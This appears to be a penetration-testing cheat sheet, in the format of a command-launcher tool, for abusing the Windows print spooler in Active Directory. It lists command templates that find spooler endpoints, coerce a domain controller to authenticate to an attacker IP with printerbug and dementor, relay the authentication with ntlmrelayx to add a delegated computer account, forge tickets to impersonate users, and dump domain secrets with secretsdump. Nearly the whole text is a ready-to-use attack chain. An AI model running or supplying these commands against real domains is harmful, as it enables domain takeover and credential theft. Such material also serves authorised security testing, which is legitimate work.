# Spooler service abuse

% printerbug, spooler service abuse, active directory, ad

## Finding Spooler services listening
```
rpcdump.py <domain>/<user>:'<password>'@<dc> | grep MS-RPRN
```

## Finding Spooler services anonymous
```
rpcdump.py <dc> | grep -A 6 MS-RPRN
```

## dementor (https://github.com/NotMedic/NetNTLMtoSilverTicket)
```
dementor.py -d <domain> -u <user> -p <pass> <attacker_ip> <dc2>
```

## printerbug (https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```
printerbug.py '<domain>/<user>:<password>'@<ip> <attacker_ip>
```

## ntlmrelayx add computer
```
ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
```

## use silver ticket
```
getST.py -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
```

## secret dump with kerberos
```
secretsdump -k <dc>
```

## list domain admins (fr)
```
net group "Admins du domaine"
```

=user:anonymous
=pass:anonymous
=computer_name:arsenal
=dc:DC01.domain.local
=dc1:DC01.domain.local
=dc2:DC02.domain.local
=computer_password:123soleil

